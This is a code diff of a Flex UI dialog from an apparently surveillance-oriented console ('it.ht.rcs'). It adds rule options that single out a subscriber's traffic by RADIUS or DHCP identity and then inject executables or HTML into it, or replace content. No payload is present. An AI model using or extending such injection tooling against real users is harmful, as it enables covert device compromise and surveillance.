@@ -9,9 +9,13 @@
   
   <fx:Script>
     <![CDATA[
+      import com.adobe.air.filesystem.FileUtil;
+      
       import it.ht.rcs.console.network.model.ProxyRule;
       
       import locale.R;
+      
+      import spark.events.IndexChangeEvent;
       
       [Bindable]
       private var _rule:ProxyRule;
@@ -20,21 +24,29 @@
       {
         _rule = rule;
         ident.selectedItem = _rule.ident;
+        action.selectedItem = _rule.action;
       }
       
       private function save():void
       {
         _rule.enabled = isEnabled.selected;
         _rule.disable_sync = sync.selected;
-        _rule.probability = parseInt(probability.text);
+        _rule.probability = probability.value;
         _rule.target_id = target.selectedItem;
         _rule.ident = ident.selectedItem;
         _rule.ident_param = ident_param.text;
         _rule.resource = resource.text;
         _rule.action = action.selectedItem;
-        _rule.action_param = action_param.text;
+        _rule.action_param = action_param_combo.selectedItem;
         close();
       }
+      
+      protected function browseClick():void
+      {
+        var ref:FileReference = new FileReference();
+        ref.browse();
+      }
+      
     ]]>
   </fx:Script>
   
@@ -49,7 +61,8 @@
     </s:FormItem>
     
     <s:FormItem label="{R.get('PROBABILITY')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
-      <s:TextInput id="probability" width="50" maxChars="3" restrict="0-9" text="{_rule.probability}"/>
+      <s:HSlider id="probability" width="200" maximum="100" minimum="0" snapInterval="1" stepSize="1"
+                 value="50"/>
     </s:FormItem>
     
     <s:FormItem label="{R.get('TARGET')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
@@ -57,12 +70,18 @@
     </s:FormItem>
     
     <s:FormItem label="{R.get('IDENT')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
-      <s:DropDownList id="ident" width="200">
+      <s:DropDownList id="ident" width="200" requireSelection="true">
         <s:dataProvider>
           <s:ArrayList>
             <fx:String>STATIC-IP</fx:String>
             <fx:String>STATIC-MAC</fx:String>
+            <fx:String>DHCP</fx:String>
+            <fx:String>RADIUS-LOGIN</fx:String>
+            <fx:String>RADIUS-CALLID</fx:String>
+            <fx:String>RADIUS-SESSID</fx:String>
+            <fx:String>RADIUS-TECHKEY</fx:String>
             <fx:String>STRING-CLIENT</fx:String>
+            <fx:String>STRING-SERVER</fx:String>
           </s:ArrayList>
         </s:dataProvider>
       </s:DropDownList>
@@ -78,11 +97,26 @@
     </s:FormItem>
     
     <s:FormItem label="{R.get('ACTION')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
-      <s:DropDownList id="action" width="200"></s:DropDownList>
+      <s:DropDownList id="action" width="200" requireSelection="true">
+         <s:dataProvider>
+           <s:ArrayList>
+             <fx:String id="injectExe">INJECT-EXE</fx:String>
+             <fx:String id="injectHtml">INJECT-HTML</fx:String>
+             <fx:String id="replace">REPLACE</fx:String>
+           </s:ArrayList>
+         </s:dataProvider>
+       </s:DropDownList>
     </s:FormItem>
     
     <s:FormItem label="{R.get('PARAMETERS')}" skinClass="it.ht.rcs.console.skins.CompactFormItem">
-      <s:TextInput id="action_param" width="200" text="{_rule.action_param}"/>
+
+      <s:Button id="action_param_file" visible="{action.selectedItem === replace}" width="100"
+                label="{R.get('BROWSE')}" click="browseClick()"
+                includeInLayout="{action.selectedItem === replace}"/>
+      
+      <s:DropDownList id="action_param_combo" visible="{action.selectedItem !== replace}" width="200"
+                      includeInLayout="{action.selectedItem !== replace}"/>
+      
     </s:FormItem>
     
   </s:Form>
